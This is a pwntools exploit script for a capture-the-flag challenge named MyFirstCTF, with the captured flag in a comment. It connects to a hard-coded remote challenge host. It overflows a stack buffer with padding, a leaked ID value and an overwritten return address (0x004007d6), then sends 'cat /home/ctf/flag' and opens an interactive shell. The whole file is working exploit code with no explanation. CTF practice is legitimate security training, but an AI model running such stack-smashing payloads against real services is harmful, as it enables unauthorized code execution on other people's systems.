from pwn import *

r = remote('140.110.112.218', 6128) # MyFirstCTF{B3_c4r3FuL_0f_l0cAl_V4rI4b13_0N_sT4ck_OwO}
context.arch = "amd64"

r.recvuntil(":")
ID = r.recvline()[:-1]
ID = str(ID,encoding="utf-8")
log.info(ID)
ID = int(ID)
r.sendlineafter(":", "test")
payload = (b'a'*0x3C + p64(ID)).ljust(72) + p64(0x004007d6) + p64(0x004007d6) 
print(payload)
r.sendlineafter(":", payload)
# r.recvuntil("Oops! some error occured.")
r.sendline("cat /home/ctf/flag")
r.interactive()